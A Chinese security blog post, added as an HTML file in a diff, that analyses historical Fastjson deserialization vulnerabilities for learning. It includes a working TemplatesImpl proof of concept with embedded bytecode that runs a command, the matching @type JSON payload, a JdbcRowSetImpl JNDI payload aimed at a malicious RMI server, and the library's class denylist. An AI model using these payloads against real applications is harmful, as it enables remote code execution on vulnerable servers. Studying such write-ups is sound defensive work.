@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="wk" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Fastjson 反序列化历史漏洞分析 
+      
+      
+      |
+    
+     wEik1&#39;blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/avatar4.png">
+    <link rel="icon" href="/images/avatar4.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="wEik1'blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar4.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">wEik1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Fastjson 反序列化历史漏洞分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-09-08 10:50:18
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                    <b>#</b> JAVA安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                    <b>#</b> JAVA安全
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">
+                    <b>#</b> 反序列化
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/Fastjson/" title="Fastjson">
+                    <b>#</b> Fastjson
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Fastjson 阿里开发的一个 Java 库，可用于将 Java 对象转换为其 JSON 格式、 JSON 字符串转换为等效的 Java 对象。Fastjson 1.2.24 版本的远程代码执行漏洞开始，因为官方的各种奇葩修补方式不断被爆出新的反序列化漏洞。Fastjson 以前一直没有关注过，但是最近发现这个在项目上出现的次数有些过于频繁了，所以学习总结一下 Fastjson 反序列化漏洞。本文仅作学习记录。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
+<h1 id="Fastjson-1-2-24"><a href="#Fastjson-1-2-24" class="headerlink" title="Fastjson 1.2.24"></a>Fastjson 1.2.24</h1><p>17年 Fastjson 1.2.24版本被爆出存在反序列化漏洞，这个洞算是整个 Fastjson 反序列化漏洞史的开端。</p>
+<p>FastJson 序列化对象为字符串的方法主要就是<code> toJSONString</code> 方法，而反序列化还原对象的方法有三个：<code>parseObject(String text) </code>、<code>parse (String text)</code>、<code>parseObject(String text, Class\ clazz)</code></p>
+<p>其中 <code>parseObject</code>返回 <code>JSONObject</code> 而 <code>parse</code> 返回的是实际类型的对象。当在没有对应类的定义的情况下，通常情况下都会使用 <code>JSON.parseObject</code> 来获取数据。</p>
+<p>而在反序列化的过程里会自动去调用反序列化对象中的 getter、setter方法以及构造函数，这就是 Fastjson 反序列化漏洞产生的原因，具体的分析过程网上有很多就不详细写了，可以看这篇文章<a target="_blank" rel="noopener" href="http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/</a></p>
+<p>总结一下通过这三种方式去反序列化 json 字符串时 getter和setter的调用情况</p>
+<p> <code>parseObject(String text) </code>、<code>parse (String text)</code>、<code>parseObject(String text, Class\ clazz)</code></p>
+<ol>
+<li><p>parseObject(String text, Class\ clazz)</p>
+<p><strong>setter</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">方法名长度大于4且以set开头</span><br><span class="line">非静态函数		</span><br><span class="line">返回类型为void或当前类</span><br><span class="line">参数个数为1个</span><br><span class="line">方法为 public 属性</span><br></pre></td></tr></table></figure>
+<p><strong>getter</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方法名需要长于4</span><br><span class="line">非静态方法</span><br><span class="line">以 get 字符串开头，且第四个字符需要是大写字母</span><br><span class="line">方法不能有参数</span><br><span class="line">返回值类型继承自Collection \|\| Map \|\| AtomicBoolean \|\| AtomicInteger \|\|AtomicLong</span><br><span class="line">getter 方法对应的属性只能有 getter 不能有setter方法</span><br><span class="line">方法为 public 属性</span><br></pre></td></tr></table></figure></li>
+<li><p>parseObject(String text)</p>
+<p><strong>setter</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">方法名长度大于4且以set开头</span><br><span class="line">非静态函数		</span><br><span class="line">返回类型为void或当前类</span><br><span class="line">参数个数为1个</span><br><span class="line">public 属性</span><br></pre></td></tr></table></figure>
+<p><strong>getter</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方法名长度大于4且以get开头</span><br><span class="line">非静态函数		</span><br><span class="line">方法不能有参数</span><br><span class="line">public 属性</span><br></pre></td></tr></table></figure></li>
+<li><p>parse (String text)</p>
+<p><strong>setter</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">方法名长度大于4且以set开头</span><br><span class="line">非静态函数		</span><br><span class="line">返回类型为void或当前类</span><br><span class="line">参数个数为1个</span><br><span class="line">public 属性</span><br></pre></td></tr></table></figure>
+<p><strong>getter</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方法名需要长于4</span><br><span class="line">非静态方法</span><br><span class="line">以 get 字符串开头，且第四个字符需要是大写字母</span><br><span class="line">方法不能有参数</span><br><span class="line">返回值类型继承自Collection \|\| Map \|\| AtomicBoolean \|\| AtomicInteger \|\|AtomicLong</span><br><span class="line">getter 方法对应的属性只能有 getter 不能有setter方法</span><br><span class="line">方法为 public 属性</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<p>所以只要找到某个类的  setter 方法和 getter 方法或者是构造函数中存在恶意调用的代码，就算是一条成功的利用链。</p>
+<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>研究过 TemplatesImpl 链的都知道，TemplatesImpl 链的入口有两个一个是 TemplatesImpl#newTransformer()</p>
+<p>还有 TemplatesImpl#getOutputProperties()，其中 TemplatesImpl#getOutputProperties() 刚好就是一个getter 方法。</p>
+<p>构造 TemplatesImpl 链</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210908183423893.png" alt="image-20210908183423893"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastjsonTest1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException, TransformerConfigurationException, NoSuchFieldException </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        Class&lt;?&gt; clazz = obj.getClass();</span><br><span class="line">        field = clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        field = clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.decode</span><br><span class="line">                (<span class="string">&quot;yv66vgAAADMAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAcDAAdAB4BAD0vU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yDAAfACABABxieXRlY29kZXMvSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAANAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEAALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAATAAQAFAANABUACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        field = clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,<span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line"></span><br><span class="line">        obj.getOutputProperties();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>把他转换成 fastjson 格式，可以看到构造的时候 TemplatesImpl 对象关键的三个属性<code> _bytecodes</code>、<code>_name</code>、<code>_tfactory</code></p>
+<p>_bytecodes 为加载的字节码，私有属性但是有setter 方法，所以直接指定赋值就行。</p>
+<p>_name 同样也是私有属性，也存在 setter 方法。</p>
+<p>至于这个属性的作用，在 getTransletInstance() 函数里会检测<code>_name</code>是否为空，为空的话直接 return null ，所以我们得给<code>_name</code>随便赋个值。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909101621807.png" alt="image-20210909101621807"></p>
+<p><code>_tfactory</code> 属性是私有属性而且无 setter 方法，<code>_tfactory</code>类型为 TransformerFactoryImpl 类对象，有很多地方会调用 _tfactory 的某些方法，所以为空的话会导致报错退出。因为是私有属性而且无 setter 方法所以我们没办法直接给其赋值。</p>
+<p>这里有个小技巧，fastjson 在反序列化时会判断其是否存在无参构造函数，如果存在的话会直接去调用 setter 方法给属性赋值，而没有 setter 方法的属性如果开启了<code>Feature.SupportNonPublicField</code>的话也会通过反射去给属性赋值。</p>
+<p>判断 <code>Feature.SupportNonPublicField </code>是否开启</p>
+<p>com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910152718302.png" alt="image-20210910152718302"></p>
+<p>这部分代码在 com.alibaba.fastjson.util.FieldInfo</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909111553342.png" alt="image-20210909111553342"></p>
+<p>可以看到通过反射赋值时是支持给私有属性赋值的。</p>
+<p>关于无参构造函数和有参构造函数的调用逻辑在<code>/com/alibaba/fastjson/util/JavaBeanInfo.class</code>121行 获取默认构造函数也就是无参构造函数，131 判断获取到的无参构造函数是否存在，不存在则去获取构造的构造函数，也就是有参构造函数(默认会去找参数最多的那一个构造函数)，所以说当无参构造函数存在时直接就可以给所有属性赋值，包括私有属性。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910101303461.png" alt="image-20210910101303461"></p>
+<p>再说回<code>_tfactory</code> 属性虽然是私有属性，也没有 setter 方法。但是 TemplatesImpl 有无参构造函数，我们直接在 json 字符串里声明 <code>_tfactory</code> 他就会给他赋值。所以最终的 payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADMAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAcDAAdAB4BAD0vU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yDAAfACABABxieXRlY29kZXMvSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAANAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEAALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAATAAQAFAANABUACwAAAAQAAQAQAAEAEQAAAAIAEg&#x3D;&#x3D;&quot;],&quot;_name&quot;:&quot;11111&quot;,&quot;_tfactory&quot;:&#123;&#125;,&quot;_outputProperties&quot;:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里直接给TransformerFactoryImpl类型的 _tfactory 赋了一个空值，反序列化的时候会自动 new 一个 TransformerFactoryImpl 对象给其赋值。最后记得申明一个 <code>_outputProperties</code>属性，因为调用的入口是<code>getOutputProperties</code> </p>
+<p>至于为啥  <code>_outputProperties</code>属性 对应的 setter 方法是 <code>getOutputProperties</code>  ,fastjson 在获取setter方法的时候会忽略 属性名前的 <code>_</code>，而且当setter 方法的第4位不是大写时，以<code>f</code>开头也是可以的</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910103132648.png" alt="image-20210910103132648"></p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910153004347.png" alt="image-20210910153004347"></p>
+<p>这个 payload 只有在开启了<code>Feature.SupportNonPublicField</code>的时候才能调用成功，有一点鸡肋。而这个 <code>Feature.SupportNonPublicField</code> 在 Fastjson 1.2.22 引入，所以小于 1.2.22  这个 payload 也用不了 </p>
+<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p> JdbcRowSetImpl 利用链原理就是 jndi 注入，可以通过 RMI+JNDI 或者 RMI+LDAP 进行利用</p>
+<p>触发的地方在 setAutoCommit，AutoCommit参数的 setter 方法</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910165033708.png" alt="image-20210910165033708"></p>
+<p>在 1291 行去调用了 this.connect()，去连接我们构造的恶意 jndi 服务端，其中 URL 参数为 dataSourceName ，存在 setter 方法，所以能够直接赋值。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910165253257.png" alt="image-20210910165253257"></p>
+<p>构造 Payload<br>{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”rmi://127.0.0.1:1099/badClassName”, “autoCommit”:true}</p>
+<p>构造恶意的 rmi 服务端</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910171554438.png" alt="image-20210910171554438"></p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210910171424707.png" alt="image-20210910171424707"></p>
+<p>虽然使用 JdbcRowSetImpl 利用链去构造 payload 不用开启  Feature.SupportNonPublicField ，但是对 jdk 版本要求比较严格。</p>
+<p>Oracle JDK 6u45、7u21 之后：</p>
+<p>java.rmi.server.useCodebaseOnly 的默认值被设置为 true</p>
+<p>禁用自动加载远程类文件，仅从 CLASSPATH 和当前 JVM 的 java.rmi.server.codebase 指定路径加载</p>
+<p>RMI + JNDI References</p>
+<p>Oracle JDK 6u141、7u131、8u121之后：</p>
+<p>增加了com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 选项，默认值为 false</p>
+<p>不允许 RMI 和 CORBA 从远程的 Codebase 加载 Reference 工厂类</p>
+<p>LDAP + JNDI References</p>
+<p>Oracle JDK 11.0.1、8u191、7u201、6u211之后:</p>
+<p>设置 com.sun.jndi.ldap.object.trustURLCodebase 默认为 false</p>
+<p>禁止 LDAP 协议使用远程 codebase</p>
+<p>绕过 jdk 版本限制进行 jndi 注入</p>
+<p><a target="_blank" rel="noopener" href="http://j0k3r.top/2020/08/11/java-jndi-inject/#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B">http://j0k3r.top/2020/08/11/java-jndi-inject/#%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B</a></p>
+<h1 id="Fastjson-1-2-25-1-2-41"><a href="#Fastjson-1-2-25-1-2-41" class="headerlink" title="Fastjson 1.2.25-1.2.41"></a>Fastjson 1.2.25-1.2.41</h1><p>Fastjson 1.2.25 引入了 checkAutoType 安全机制，默认关闭的情况下不能反序列化类，开启后对反序列化类进行黑名单检测。同时也提供了添加和删除黑名单类的接口，用户也可以自己添加不可反序列化的类。</p>
+<p>checkAutoType 安全机制实现的逻辑主要在 <code>com.alibaba.fastjson.parser.ParserConfig</code></p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913102728936.png" alt="image-20210913102728936"></p>
+<p>默认的黑名单为  denyList </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">bsh,com.mchange,com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate,org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core,org.springframework</span><br></pre></td></tr></table></figure>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913102238753.png" alt="image-20210913102238753"></p>
+<p>先检测白名单后黑名单，白名单默认是空的，检测方式其实就是判断是否以名单中的字符串开始。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210913103003768.png" alt="image-20210913103003768"></p>
+<p>黑名单里把 java.rmi 和  org.apache.commons.collections.Transformer 还有一些常见的反序列化链用到的类都给 ban 了，所以之前的 payload 也用不了了。</p>
+<p>未开启 AutoType 或者命中了黑名单会爆 autoType is not support. </p>
